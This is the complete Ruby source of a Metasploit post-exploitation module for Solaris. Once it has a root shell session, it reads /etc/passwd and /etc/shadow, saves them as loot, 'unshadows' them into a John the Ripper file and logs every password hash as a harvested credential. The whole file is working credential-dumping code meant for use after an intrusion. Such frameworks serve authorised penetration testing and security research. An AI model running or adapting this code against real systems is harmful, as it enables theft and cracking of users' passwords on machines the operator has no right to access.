##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Solaris::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Solaris Gather Dump Password Hashes for Solaris Systems',
        'Description' => %q{
          Post module to dump the password hashes for all users on a Solaris system.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform' => [ 'solaris' ],
        'SessionTypes' => [ 'shell' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  def run
    fail_with(Failure::NoAccess, 'You must run this module as root!') unless is_root?

    passwd_file = read_file('/etc/passwd')
    shadow_file = read_file('/etc/shadow')

    # Save in loot the passwd and shadow file
    p1 = store_loot('solaris.shadow', 'text/plain', session, shadow_file, 'shadow.tx', 'Solaris Password Shadow File')
    p2 = store_loot('solaris.passwd', 'text/plain', session, passwd_file, 'passwd.tx', 'Solaris Passwd File')
    vprint_good("Shadow saved in: #{p1}")
    vprint_good("passwd saved in: #{p2}")

    # Unshadow the files
    john_file = unshadow(passwd_file, shadow_file)
    john_file.each_line do |l|
      hash_parts = l.split(':')
      jtr_format = Metasploit::Framework::Hashes.identify_hash hash_parts[1]
      if jtr_format.empty? # overide the default
        jtr_format = 'des,bsdi,crypt'
      end
      credential_data = {
        jtr_format: jtr_format,
        origin_type: :session,
        post_reference_name: refname,
        private_type: :nonreplayable_hash,
        private_data: hash_parts[1],
        session_id: session_db_id,
        username: hash_parts[0],
        workspace_id: myworkspace_id
      }
      create_credential(credential_data)
      print_good(l.chomp)
    end

    # Save pwd file
    upassf = store_loot('solaris.hashes', 'text/plain', session, john_file, 'unshadowed_passwd.pwd', 'Solaris Unshadowed Password File')
    print_good("Unshadowed Password File: #{upassf}")
  end

  def unshadow(pf, sf)
    unshadowed = ''
    sf.each_line do |sl|
      pass = sl.scan(/^\w*:([^:]*)/).join
      next unless pass !~ /^\*LK\*|^NP/

      user = sl.scan(/(^\w*):/).join
      pf.each_line do |pl|
        if pl.match(/^#{user}:/)
          unshadowed << pl.gsub(/:x:/, ":#{pass}:")
        end
      end
    end

    return unshadowed
  end
end
